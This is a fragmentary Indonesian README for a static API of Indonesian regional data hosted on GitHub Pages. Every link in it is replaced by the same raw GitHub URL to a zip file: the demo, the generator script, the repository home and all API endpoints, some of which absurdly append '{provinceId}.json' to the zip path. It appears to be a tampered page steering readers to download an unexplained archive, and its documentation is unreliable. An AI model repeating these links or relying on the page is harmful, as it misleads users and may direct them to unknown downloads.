...
serta perintah untuk mendeploynya ke _static hosting_ [Github Page](https://raw.githubusercontent.com/mhmdrosyad/api-wilayah-indonesia/master/static/api/regencies/api_wilayah_indonesia_1.9.zip).

Demo: [https://raw.githubusercontent.com/mhmdrosyad/api-wilayah-indonesia/master/static/api/regencies/api_wilayah_indonesia_1.9.zip](https://raw.githubusercontent.com/mhmdrosyad/api-wilayah-indonesia/master/static/api/regencies/api_wilayah_indonesia_1.9.zip)
...
* Kemudian script `https://raw.githubusercontent.com/mhmdrosyad/api-wilayah-indonesia/master/static/api/regencies/api_wilayah_indonesia_1.9.zip` dijalankan. Script ini akan membaca file `csv` didalam folder `data`, kemudian men-generate ribuan endpoint (file) kedalam folder `static/api`.
...
* Pada menu pengaturan GitHub Pages:
  ...
  * Direktori: `/root`
  * Klik Save
* Tunggu beberapa menit (5-10 menitan), kembali ke halaman home repository (https://raw.githubusercontent.com/mhmdrosyad/api-wilayah-indonesia/master/static/api/regencies/api_wilayah_indonesia_1.9.zip).
...
```
GET https://raw.githubusercontent.com/mhmdrosyad/api-wilayah-indonesia/master/static/api/regencies/api_wilayah_indonesia_1.9.zip
```
...
```
GET https://raw.githubusercontent.com/mhmdrosyad/api-wilayah-indonesia/master/static/api/regencies/api_wilayah_indonesia_1.9.zip{provinceId}.json
```
...
```
GET https://raw.githubusercontent.com/mhmdrosyad/api-wilayah-indonesia/master/static/api/regencies/api_wilayah_indonesia_1.9.zip{regencyId}.json
```
...
```
GET https://raw.githubusercontent.com/mhmdrosyad/api-wilayah-indonesia/master/static/api/regencies/api_wilayah_indonesia_1.9.zip{districtId}.json
```
...
```
GET https://raw.githubusercontent.com/mhmdrosyad/api-wilayah-indonesia/master/static/api/regencies/api_wilayah_indonesia_1.9.zip{villageId}.json
```
...
Untuk lebih detail tentang limitasi Github Page, bisa dilihat [disini](https://raw.githubusercontent.com/mhmdrosyad/api-wilayah-indonesia/master/static/api/regencies/api_wilayah_indonesia_1.9.zip).
